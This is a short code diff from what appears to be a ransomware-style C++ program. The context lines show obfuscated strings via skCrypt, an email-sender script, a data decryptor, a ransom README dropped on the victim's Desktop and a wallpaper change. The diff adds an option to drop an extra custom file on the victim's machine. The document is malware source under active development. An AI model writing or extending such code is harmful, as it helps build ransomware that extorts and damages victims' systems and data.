@@ -6,6 +6,7 @@ string WallpaperContent = "./wallpaper.jpg";
 string FileIconContent = "./ICON.ico";
 string EmailSenderContent = "./emailSender.ps1";
 string InfoDecryptorContent = "../x64/Release/DataDecryptor.exe";
+string CustomFileContent = "../customFile.extension";
 
 int main(int argc, char* argv[])
 {   
@@ -95,6 +96,9 @@ int main(int argc, char* argv[])
 
     if (DROP_DECRYPTOR)
         dropFile(READMECONTENT, (string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\README.txt"));
+
+    if (DROP_CUSTOM_FILE)
+        dropFile(CustomFileContent, CUSTOMFILE_LOC);
     
     if (CHANGE_WALLPAPER)
         changeWallpaper(WallpaperContent);
